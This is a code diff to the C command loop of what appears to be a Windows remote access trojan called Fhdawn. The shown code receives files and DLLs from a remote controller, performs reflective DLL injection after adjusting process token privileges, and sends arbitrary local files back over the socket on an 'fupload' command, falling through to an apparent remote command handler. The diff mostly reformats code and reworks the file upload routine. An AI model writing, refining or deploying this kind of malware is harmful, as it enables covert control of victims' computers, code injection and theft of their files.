@@ -105,8 +105,8 @@ void fhdawn_main(void)
             else {
                 memset(recvbuf, '\0', BUFFER); // Clear main buffer
                 int total = 0; // Total bytes received
-                
-                do{ // IF Total is equal to expected bytes. Break the loop, And stop receiving.
+
+                do { // IF Total is equal to expected bytes. Break the loop, And stop receiving.
                     fsize = recv(sockfd, recvbuf, BUFFER, 0); // Receive file
                     if (fsize == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                     {
@@ -114,14 +114,14 @@ void fhdawn_main(void)
                         printf("[X] Connection interrupted while receiving file %s for %s size.", fileinfo[0], fileinfo[1]);
                     }
                     else if (fsize == 0) {
-                        break;  
+                        break;
                     }
                     else {
                         write = WriteFile(recvfile, recvbuf, fsize, &dwBytesWritten, NULL); // Write file data to file
                         total += fsize; // Add number of bytes received to total.
                     }
-                } while(total != expected);
-                
+                } while (total != expected);
+
                 if (write == FALSE)
                 {
                     sockprintf(sockfd, "[Error Writing file %s of %s size] Error : %ld.", fileinfo[0], fileinfo[1], GetLastError());
@@ -135,7 +135,7 @@ void fhdawn_main(void)
         // Reflective DLL Injection over socket
         else if (strcmp(recvbuf, "fdll") == 0)
         {
-            
+
             memset(temp, '\0', BUFFER);
             int return_code = recv(sockfd, temp, BUFFER, 0);
             if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
@@ -151,7 +151,7 @@ void fhdawn_main(void)
             ZeroMemory(DLL, expected + 1);
             int total = 0;
 
-            do{
+            do {
                 fsize = recv(sockfd, recvbuf, BUFFER, 0);
                 if (fsize == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                 {
@@ -165,7 +165,7 @@ void fhdawn_main(void)
                     memcpy(DLL + total, recvbuf, fsize);
                     total += fsize;
                 }
-            } while(total != expected);
+            } while (total != expected);
 
             do {
                 if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
@@ -203,20 +203,25 @@ void fhdawn_main(void)
 
         }
         // Upload File to Server
-        // TODO: Fix File transfer protocol
         else if (strstr(recvbuf, "fupload") != NULL)
         {
             memset(fileinfo, '\0', 3);
             split(recvbuf, fileinfo, ":");
-            char fbuffer[500];
-            memset(fbuffer, '\0', 500);
-            sockprintf(sockfd, "FILE:%s", fileinfo[1]);
+            
             int bytes_read;
-            FILE* fs = fopen(fileinfo[1], "rb"); // I'm using fopen instead of ReadFile because this is much easier for me and this works
-            if (fs == NULL) {
-                sockprintf(sockfd, "[Error Opening file %s (Error %ld) ]", fileinfo[1], GetLastError());
-            }
-            else {
+            FILE* fs;
+            // I'm using fopen instead of GetFileSizeEx because this is much easier for me and this works
+            // IF you'd like to update this, fork and make a pull request, I will happily accept
+            if ((fs = fopen(fileinfo[1], "rb")) != NULL)
+            {
+                fseek(fs, 0L, SEEK_END);
+                long filesize = ftell(fs);
+                fseek(fs, 0, SEEK_SET);
+
+                sockprintf(sockfd, "FILE:%s:%ld", fileinfo[1], filesize);
+                Sleep(1000);
+                char fbuffer[500];
+                memset(fbuffer, '\0', 500);
                 while (!feof(fs)) {
                     if ((bytes_read = fread(&fbuffer, 1, 500, fs)) > 0) {
                         send(sockfd, fbuffer, bytes_read, 0);
@@ -225,9 +230,15 @@ void fhdawn_main(void)
                         break;
                     }
                 }
+                fclose(fs);
             }
-            fclose(fs);
+
+            else {
+                sockprintf(sockfd, "[ Error Opening file %s (Error %ld) ]", fileinfo[1], GetLastError());
+            }
+            
         }
+
         else {
             ExecSock();
         }
